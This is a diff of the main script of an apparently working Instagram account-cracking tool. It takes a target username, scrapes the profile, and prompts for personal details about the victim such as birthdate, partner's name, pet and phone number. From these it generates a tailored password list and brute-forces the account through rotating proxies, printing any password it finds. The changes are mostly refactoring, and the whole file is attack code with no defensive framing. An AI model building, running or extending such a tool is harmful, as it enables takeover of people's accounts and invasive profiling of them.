@@ -1,22 +1,39 @@
 #!/usr/bin/env python3
-import sys
 import json
 import os
+import sys
 
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 
 from core.banner import (
-    show_banner, show_menu, show_info_panel,
-    show_password_stats, R, G, Y, C, M, W, RE, console
+    C,
+    G,
+    M,
+    R,
+    RE,
+    W,
+    Y,
+    console,
+    show_banner,
+    show_info_panel,
+    show_menu,
+    show_password_stats,
 )
+from core.brute_attacker import BruteAttacker
+from core.config import DATA_DIR, OUTPUT_DIR, TARGET_PASSWORD_COUNT
 from core.info_gather import InstagramInfoGatherer
 from core.password_engine import PasswordEngine
-from core.brute_attacker import BruteAttacker
 from core.proxy_rotator import ProxyRotator
+
+try:
+    from core import config as app_config
+except Exception:
+    app_config = None
+
 
 def collect_personal_info(username):
     console.print(f"\n{M}[ PERSONAL INFORMATION COLLECTION ]{RE}")
-    console.print(f"{Y}Enter as much information as you know about @{username}{RE}")
+    console.print(f"{Y}Enter as much info as you know about @{username}{RE}")
     console.print(f"{Y}More information = better password generation{RE}\n")
 
     personal_info = {
@@ -41,133 +58,141 @@ def collect_personal_info(username):
         personal_info["birth_month"] = input(f"{C}[?] Birth month (MM): {W}").strip()
         personal_info["birth_year"] = input(f"{C}[?] Birth year (YYYY): {W}").strip()
 
-    personal_info["girlfriend_name"] = input(f"{C}[?] Girlfriend/Boyfriend name: {W}").strip()
+    personal_info["girlfriend_name"] = input(
+        f"{C}[?] Girlfriend/Boyfriend name: {W}"
+    ).strip()
     personal_info["pet_name"] = input(f"{C}[?] Pet name: {W}").strip()
-    personal_info["favorite_thing"] = input(f"{C}[?] Favorite thing (sport/team/hobby): {W}").strip()
+    personal_info["favorite_thing"] = input(
+        f"{C}[?] Favorite thing (sport/team/hobby): {W}"
+    ).strip()
     personal_info["nickname"] = input(f"{C}[?] Nickname: {W}").strip()
-    personal_info["phone_number"] = input(f"{C}[?] Phone number (if known): {W}").strip()
+    personal_info["phone_number"] = input(f"{C}[?] Phone number: {W}").strip()
 
-    print(f"\n{Y}[*] Additional keywords (one per line, empty to finish):{RE}")
-    while True:
-        word = input(f"{C}    > {W}").strip()
-        if not word:
-            break
-        personal_info["additional_words"].append(word)
+    extra = input(
+        f"{C}[?] Extra words (comma separated): {W}"
+    ).strip()
+    if extra:
+        personal_info["additional_words"] = [
+            x.strip() for x in extra.split(",") if x.strip()
+        ]
+
     return personal_info
+
+
+def _make_gatherer():
+    pr = ProxyRotator()
+    proxy = pr.get_next_proxy() if pr.proxies else None
+    return InstagramInfoGatherer(proxy=proxy, proxy_list=pr.list_proxies())
+
 
 def mode_info_gathering():
     show_banner()
-    username = input(f"\n{C}[?] Enter Instagram username: {W}@").strip()
+    username = input(f"\n{C}[?] Enter target Instagram username: {W}@").strip().lstrip(
+        "@"
+    )
     if not username:
         console.print(f"{R}[!] Username required!{RE}")
         return
 
-    gatherer = InstagramInfoGatherer()
+    gatherer = _make_gatherer()
     data = gatherer.extract_profile_data(username)
-    if data:
-        show_info_panel(username, data)
-        output_dir = os.path.join("output", "profiles")
-        os.makedirs(output_dir, exist_ok=True)
-        filepath = os.path.join(output_dir, f"{username}_profile.json")
-        with open(filepath, "w", encoding="utf-8") as f:
-            json.dump(data, f, indent=2, ensure_ascii=False)
-        console.print(f"{G}[+] Profile saved to: {filepath}{RE}")
-    else:
-        console.print(f"{R}[!] Could not retrieve profile information{RE}")
+    show_info_panel(username, data)
+
 
 def mode_password_generation():
     show_banner()
-    username = input(f"\n{C}[?] Enter target username: {W}@").strip()
+    username = input(f"\n{C}[?] Enter target Instagram username: {W}@").strip().lstrip(
+        "@"
+    )
     if not username:
         console.print(f"{R}[!] Username required!{RE}")
         return
 
-    gatherer = InstagramInfoGatherer()
-    profile_data = gatherer.extract_profile_data(username)
-    if profile_data:
-        show_info_panel(username, profile_data)
+    use_net = input(f"{C}[?] Fetch profile from Instagram? (y/n): {W}").strip().lower()
+    data = {"username": username}
+    if use_net in ("y", "yes", ""):
+        gatherer = _make_gatherer()
+        data = gatherer.extract_profile_data(username)
+        show_info_panel(username, data)
 
-    personal_info = collect_personal_info(username)
-    engine = PasswordEngine(
-        target_data=profile_data or {
-            "username": username,
-            "extracted_names": [],
-            "extracted_dates": [],
-            "extracted_keywords": [],
-        },
-        personal_info=personal_info,
-    )
-    passwords = engine.generate_passwords(target_count=18000)
+    personal = collect_personal_info(username)
+    engine = PasswordEngine(target_data=data, personal_info=personal)
+
+    try:
+        count = int(
+            input(
+                f"{C}[?] How many passwords? [{TARGET_PASSWORD_COUNT}]: {W}"
+            ).strip()
+            or str(TARGET_PASSWORD_COUNT)
+        )
+    except ValueError:
+        count = TARGET_PASSWORD_COUNT
+
+    console.print(f"{Y}[*] Generating passwords...{RE}")
+    passwords = engine.generate_passwords(target_count=count)
     show_password_stats(passwords)
 
-    os.makedirs(os.path.join("output", "wordlists"), exist_ok=True)
-    filepath = os.path.join("output", "wordlists", f"{username}_passwords.txt")
-    with open(filepath, "w", encoding="utf-8") as f:
-        for pwd in passwords:
-            f.write(pwd + "\n")
-    console.print(f"{G}[+] {len(passwords):,} passwords saved to: {filepath}{RE}")
+    os.makedirs(os.path.join(DATA_DIR, "wordlists"), exist_ok=True)
+    out = os.path.join(DATA_DIR, "wordlists", f"{username}_passwords.txt")
+    with open(out, "w", encoding="utf-8") as f:
+        for p in passwords:
+            f.write(p + "\n")
+    console.print(f"{G}[+] Saved: {out}{RE}")
+
 
 def mode_full_attack():
     show_banner()
-    username = input(f"\n{C}[?] Enter target Instagram username: {W}@").strip()
+    username = input(f"\n{C}[?] Enter target Instagram username: {W}@").strip().lstrip(
+        "@"
+    )
     if not username:
         console.print(f"{R}[!] Username required!{RE}")
         return
 
-    console.print(f"\n{Y}[STEP 1/4] Gathering target intelligence...{RE}")
-    gatherer = InstagramInfoGatherer()
-    profile_data = gatherer.extract_profile_data(username)
-    if profile_data:
-        show_info_panel(username, profile_data)
-    else:
-        profile_data = {
-            "username": username,
-            "extracted_names": [],
-            "extracted_dates": [],
-            "extracted_keywords": [],
-            "full_name": "",
-            "biography": "",
-        }
-        console.print(f"{Y}[!] Limited profile data - using username only{RE}")
+    gatherer = _make_gatherer()
+    data = gatherer.extract_profile_data(username)
+    show_info_panel(username, data)
 
-    console.print(f"\n{Y}[STEP 2/4] Collecting personal information...{RE}")
-    personal_info = collect_personal_info(username)
-
-    console.print(f"\n{Y}[STEP 3/4] Generating password list...{RE}")
-    engine = PasswordEngine(target_data=profile_data, personal_info=personal_info)
-    passwords = engine.generate_passwords(target_count=18000)
+    personal = collect_personal_info(username)
+    engine = PasswordEngine(target_data=data, personal_info=personal)
+    console.print(f"{Y}[*] Generating passwords...{RE}")
+    passwords = engine.generate_passwords()
     show_password_stats(passwords)
-    if not passwords:
-        console.print(f"{R}[!] No passwords generated!{RE}")
-        return
 
-    console.print(f"\n{Y}[STEP 4/4] Starting brute force attack...{RE}")
-    print(f"\n{R}[WARNING] This will test {len(passwords):,} passwords{RE}")
-    confirm = input(f"\n{C}[?] Continue? (yes/no): {W}").strip().lower()
+    os.makedirs(os.path.join(DATA_DIR, "wordlists"), exist_ok=True)
+    wl = os.path.join(DATA_DIR, "wordlists", f"{username}_passwords.txt")
+    with open(wl, "w", encoding="utf-8") as f:
+        for p in passwords:
+            f.write(p + "\n")
+    console.print(f"{G}[+] Wordlist: {wl}{RE}")
+
+    confirm = input(f"\n{C}[?] Start attack? (yes/no): {W}").strip().lower()
     if confirm not in ("yes", "y"):
-        console.print(f"{Y}[!] Attack cancelled{RE}")
         return
 
     try:
-        threads = int(input(f"{C}[?] Threads (1-5, recommended 2-3): {W}").strip() or "2")
+        threads = int(input(f"{C}[?] Threads (1-5): {W}").strip() or "2")
         threads = max(1, min(5, threads))
     except ValueError:
         threads = 2
 
-    attacker = BruteAttacker(username, passwords, ProxyRotator())
-    found_password = attacker.start_attack(threads=threads)
-    if found_password:
+    found = BruteAttacker(username, passwords, ProxyRotator()).start_attack(
+        threads=threads
+    )
+    if found:
         console.print(f"\n{G}{'=' * 60}{RE}")
-        console.print(f"{G}[SUCCESS] Password found!{RE}")
         console.print(f"{G}Username: {username}{RE}")
-        console.print(f"{G}Password: {found_password}{RE}")
+        console.print(f"{G}Password: {found}{RE}")
         console.print(f"{G}{'=' * 60}{RE}")
     else:
         console.print(f"\n{Y}[!] Password not found in generated list{RE}")
 
+
 def mode_brute_force_only():
     show_banner()
-    username = input(f"\n{C}[?] Enter target Instagram username: {W}@").strip()
+    username = input(f"\n{C}[?] Enter target Instagram username: {W}@").strip().lstrip(
+        "@"
+    )
     wordlist_path = input(f"{C}[?] Path to wordlist file: {W}").strip()
     if not username or not wordlist_path:
         console.print(f"{R}[!] Username and wordlist required!{RE}")
@@ -192,6 +217,7 @@ def mode_brute_force_only():
 
     BruteAttacker(username, passwords, ProxyRotator()).start_attack(threads=threads)
 
+
 def mode_proxy_config():
     show_banner()
     proxy_rotator = ProxyRotator()
@@ -211,7 +237,9 @@ def mode_proxy_config():
             else:
                 print(f"    {Y}No proxies configured{RE}")
         elif choice == "2":
-            proxy = input(f"{C}[?] Enter proxy (ip:port or ip:port:user:pass): {W}").strip()
+            proxy = input(
+                f"{C}[?] Enter proxy (ip:port or ip:port:user:pass): {W}"
+            ).strip()
             if proxy_rotator.add_proxy(proxy):
                 console.print(f"{G}[+] Proxy added{RE}")
             else:
@@ -241,9 +269,10 @@ def mode_proxy_config():
         elif choice == "0":
             break
 
+
 def mode_view_results():
     show_banner()
-    results_dir = os.path.join("output", "results")
+    results_dir = OUTPUT_DIR
     if not os.path.exists(results_dir):
         console.print(f"{Y}[!] No results directory{RE}")
         return
@@ -264,16 +293,20 @@ def mode_view_results():
             except Exception:
                 console.print(f"  {Y}File: {fname}{RE}")
 
+
 def mode_settings():
     show_banner()
-    from core import config
+    if app_config is None:
+        console.print(f"{R}[!] config not loaded{RE}")
+        return
     console.print(f"\n{M}[ SETTINGS & CONFIGURATION ]{RE}")
-    console.print(f"{C}Target Password Count:{W} {config.TARGET_PASSWORD_COUNT}{RE}")
-    console.print(f"{C}Min Delay:{W} {config.MIN_DELAY}s{RE}")
-    console.print(f"{C}Max Delay:{W} {config.MAX_DELAY}s{RE}")
-    console.print(f"{C}Max Attempts per IP:{W} {config.MAX_ATTEMPTS_PER_IP}{RE}")
-    console.print(f"{C}Cooldown Period:{W} {config.COOLDOWN_PERIOD}s{RE}")
+    console.print(f"{C}Target Password Count:{W} {app_config.TARGET_PASSWORD_COUNT}{RE}")
+    console.print(f"{C}Min Delay:{W} {app_config.MIN_DELAY}s{RE}")
+    console.print(f"{C}Max Delay:{W} {app_config.MAX_DELAY}s{RE}")
+    console.print(f"{C}Max Attempts per IP:{W} {app_config.MAX_ATTEMPTS_PER_IP}{RE}")
+    console.print(f"{C}Cooldown Period:{W} {app_config.COOLDOWN_PERIOD}s{RE}")
     print(f"\n{Y}[*] Edit core/config.py to modify these settings{RE}")
+
 
 def main():
     try:
@@ -306,6 +339,7 @@ def main():
         console.print(f"\n\n{Y}[!] Interrupted by user{RE}")
         console.print(f"{G}[+] Goodbye!{RE}\n")
         sys.exit(0)
+
 
 if __name__ == "__main__":
     main()
